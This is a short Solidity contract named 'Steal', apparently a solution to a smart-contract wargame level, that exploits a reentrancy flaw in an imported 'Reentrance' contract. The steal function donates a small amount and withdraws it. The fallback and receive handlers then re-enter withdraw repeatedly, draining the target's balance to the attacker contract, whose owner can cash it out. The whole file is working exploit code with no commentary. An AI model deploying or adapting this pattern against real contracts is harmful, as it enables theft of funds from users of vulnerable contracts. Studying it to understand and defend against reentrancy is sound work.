// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Steal {
    address private owner;
    Reentrance private reentrance;

    constructor(address _reentranceAddress) payable {
        owner = msg.sender;
        reentrance = Reentrance(_reentranceAddress);
    }

    function withdraw() public payable {
        require(msg.sender == owner);

        uint256 balance = address(this).balance;
        require(balance > 0);

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to withdraw.");
    }

    function steal() public payable {
        require(msg.sender == owner);
        require(msg.value >= 100 wei);

        reentrance.donate{value: 100 wei}(address(this));
        reentrance.withdraw(100);
    }

    function receiveFunds() internal {
        if (address(reentrance).balance >= 100 wei) {
            reentrance.withdraw(100);
        }
    }

    fallback() external payable {
        receiveFunds();
    }

    receive() external payable {
        receiveFunds();
    }
}
